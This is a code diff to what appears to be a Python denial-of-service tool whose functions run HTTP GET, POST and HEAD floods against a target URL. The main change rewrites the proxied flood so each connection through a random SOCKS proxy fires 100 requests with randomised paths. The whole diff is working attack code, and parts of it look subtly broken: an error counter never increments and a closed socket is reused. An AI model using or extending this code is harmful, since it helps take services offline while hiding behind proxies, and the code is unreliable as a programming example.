@@ -34,7 +34,7 @@ def http_get(worker_id, session, target_url, attack_duration, useragent=None, re
     # first thread kills the entire chain
     Core.attackrunning = False
 
-def http_post(worker_id, session, target_url, attack_duration, useragent=None, referer=None, post_data=None):
+def http_post(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
     '''
     HTTP POST flood
     '''
@@ -78,7 +78,7 @@ def http_post(worker_id, session, target_url, attack_duration, useragent=None, r
 
     Core.attackrunning = False
 
-def http_fast(worker_id, session, target_url, attack_duration, useragent=None):
+def http_fast(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
     '''
     basic GET / flood
     '''
@@ -102,7 +102,7 @@ def http_fast(worker_id, session, target_url, attack_duration, useragent=None):
 
     Core.attackrunning = False
 
-def http_head(worker_id, session, target_url, attack_duration, useragent=None):
+def http_head(worker_id, session, target_url, attack_duration, useragent=None, referer=None):
     '''
     Basic HEAD flood
     '''
@@ -271,42 +271,48 @@ def http_proxy(worker_id, proto, target_url, attack_duration, useragent, referer
     host = urlparse(target_url).netloc
     port = 443 if target_url.startswith('https://') else 80
 
+    s = socks.socksocket()
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
+    s.settimeout(4)
+
+    if port == 443: # ssl
+        ctx = ssl.SSLContext()
+        s = ctx.wrap_socket(s,server_hostname=host)
+
     stoptime = time.time() + attack_duration
     while time.time() < stoptime and Core.attackrunning:
         try:
-            s = socks.socksocket()
-            #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            #s.setsockopt(socket.SOL_SOCKET, socket.TCP_NODELAY, 1)
-            s.settimeout(4)
 
-            if port == 443: # ssl
-                ctx = ssl.SSLContext()
-                s = ctx.wrap_socket(s,server_hostname=host)
+            errcount = 0 # reset counter
+            proxip, proxport = choice(Core.proxy_pool).split(':')
 
-            # build packet
-            headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
-            packet = f'GET /{buildblock("/")} HTTP/1.1\r\n{headers}\r\n'.encode()
-
-            errcount = 0
-            while Core.attackrunning: # run while we should attack
+            while Core.attackrunning:
                 if errcount >= 40:
                     Core.proxy_pool.delete(f'{proxip}:{proxport}'); break
 
-                try: 
-                    proxip, proxport = choice(Core.proxy_pool).split(':')
-
+                try:
                     s.set_proxy(proto, proxip, int(proxport))
                     s.connect( (host, int(port) ))
+                    for _ in range(100):
+                        try:
+                            # build packet
+                            headers = ''.join([f'{key}: {value}\r\n' for key,value in buildheaders(target_url, useragent, referer).items()])
+                            packet = f'GET /{buildblock("/")} HTTP/1.1\r\nHost: {host}:{str(port)}\r\n{headers}\r\n'.encode()
+                            
+                            s.send( packet )
 
-                    s.send( packet )
-                    Core.infodict[worker_id]['req_sent'] += 1
+                            Core.infodict[worker_id]['req_sent'] += 1
+                        except:
+                            Core.infodict[worker_id]['req_fail'] += 1
+                        Core.infodict[worker_id]['req_total'] += 1
+                    s.close()
+
                 except Exception:
                     errcount+1
-                    Core.infodict[worker_id]['req_fail'] += 1
 
-                Core.infodict[worker_id]['req_total'] += 1
-
-        except Exception as e:
+        except Exception:
+            s.close()
             Core.infodict[worker_id]['req_fail'] += 1
     Core.threadcount -= 1
     
